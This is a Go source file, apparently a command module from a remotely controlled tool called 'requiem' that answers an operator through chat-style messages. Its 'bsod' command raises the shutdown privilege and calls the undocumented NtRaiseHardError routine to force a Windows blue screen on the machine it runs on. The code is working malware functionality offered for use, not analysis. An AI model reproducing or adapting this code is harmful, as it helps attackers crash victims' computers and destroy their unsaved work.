package commands

import (
	"unsafe"

	"requiem/store"
)

func (*CrashCommand) Exec(ctx *store.CommandContext, args []string) {
	if store.DEBUG_MODE && store.DEBUG_MODE_BLOCK_DANGEROUS_FUNCS {
		ctx.ReplyMsg("🟥 You cannot do this in debug mode.")
		return
	}

	var old int32
	var res uint32

	ret, _, _ := store.AdjustPrivilege.Call(
		uintptr(19),
		uintptr(1),
		uintptr(0),
		uintptr(unsafe.Pointer(&old)),
	)

	if ret != 0 {
		ctx.ReplyMsg("🟥 Failed to adjust privileges.")
	}

	initial, _ := ctx.ReplyMsg("🟩 Successfully triggered crash.")

	ret, _, _ = store.RaiseHardError.Call(
		uintptr(0xC000007B),
		uintptr(0),
		uintptr(0),
		uintptr(0),
		uintptr(6),
		uintptr(unsafe.Pointer(&res)),
	)

	if ret != 0 {
		ctx.DeleteMsg(initial.ID)
		ctx.ReplyMsg("🟥 Failed to trigger crash.")
		return
	}

	ctx.DeleteMsg(initial.ID)
	ctx.ReplyMsg("🟥 Failed to crash.")
}

func (*CrashCommand) Name() string {
	return "bsod"
}

func (*CrashCommand) Info() string {
	return "Triggers the blue screen of death."
}

type CrashCommand struct{}
